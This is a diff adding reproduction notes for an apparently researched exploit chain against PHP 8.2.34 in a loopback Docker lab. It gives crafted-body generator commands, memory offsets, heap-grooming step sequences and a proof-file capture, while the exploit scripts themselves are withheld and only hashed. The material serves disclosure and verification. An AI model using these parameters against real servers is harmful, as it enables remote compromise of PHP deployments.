@@ -1,0 +1,66 @@
+# PHP 8.2.34 — exact commands for the target-written proof
+#
+# Placeholders used for publication:
+#   <RUNDIR>     private lab run root (not shipped)
+#   <PORT>       loopback port
+#   <container>  disposable container name
+#
+# The body files and the cold_chain.py driver are retained privately; their
+# hashes are in report.md. The bodies below match the recorded Oct-24 hashes
+# exactly.
+
+## 1. Bodies
+
+python3 <RUNDIR>/scripts/mk_a1t_gen.py --out <RUNDIR>/bodies/a1_8234.bin \
+  --big 78 --burners 21 --progress-len 8 --tval 4 --tval-len 80
+
+SPEC=$(python3 -c 'print("V:255,V:255,V:255,V:255,F" + ",V:255"*23 + ",X:900")')
+python3 <RUNDIR>/scripts/mk_b1_82.py --out <RUNDIR>/bodies/b1_8234.bin \
+  --spec "$SPEC" --fake-len 0x11D680
+
+sha256sum <RUNDIR>/bodies/a1_8234.bin
+# 673cc3175551a35934d9ac11dbe26d06d9b83c6b3e32db35272eed515ab0201c
+sha256sum <RUNDIR>/bodies/b1_8234.bin
+# d4ef67293645f5beeafac1798f6fb92abed35fa90936b8a6fbfbcc522323e2d3
+
+## 2. Stock container
+
+docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
+  -v <RUNDIR>/www:/var/www/html \
+  -v <RUNDIR>/logs:/var/log/apache2 \
+  -v <RUNDIR>/conf/php.ini:/usr/local/etc/php/php.ini \
+  php:8.2.34-apache
+
+# /var/www/html/index.php is the 22-byte stub:
+#   <?php echo "OK\n"; ?>
+# plus a trailing newline.
+
+## 3. Chain, run 1
+
+python3 <RUNDIR>/scripts/cold_chain.py --container <container> --port <PORT> \
+  --tag 8234b_r1 --zd-off 0x487650 --zif-off 0x39b8a0 --s-off 0xF9398 \
+  --steps "warmup:20,holders:149:640,ramp:15,a1,b1,a2,b2,marker" \
+  --logfile <RUNDIR>/out/run_8234b_r1.log
+
+## 4. Chain, run 2 (same container, after the pool recovered)
+
+python3 <RUNDIR>/scripts/cold_chain.py --container <container> --port <PORT> \
+  --tag 8234b_r2 --zd-off 0x487650 --zif-off 0x39b8a0 --s-off 0xF9398 \
+  --steps "warmup:20,holders:149:640,ramp:15,a1,b1,a2,b2,marker" \
+  --logfile <RUNDIR>/out/run_8234b_r2.log
+
+## 5. Proof capture
+
+# The driver deletes /tmp/p1 before the run and only reads it after the run.
+docker exec <container> stat -c '%A %U %G %s %y %n' /tmp/p1
+docker exec <container> cat /tmp/p1
+
+# Stored captures:
+#   proof/proof_8234b_r2.txt  124 B  stat + uid + tag
+#   proof/proof_8234b_r1.txt  1995 B stat + uid + tag + appended error log
+# The in-container marker itself is 69 B in both runs.
+
+## 6. Verification
+
+cd receipts/php-8.2.34
+sha256sum -c sha256sums.txt
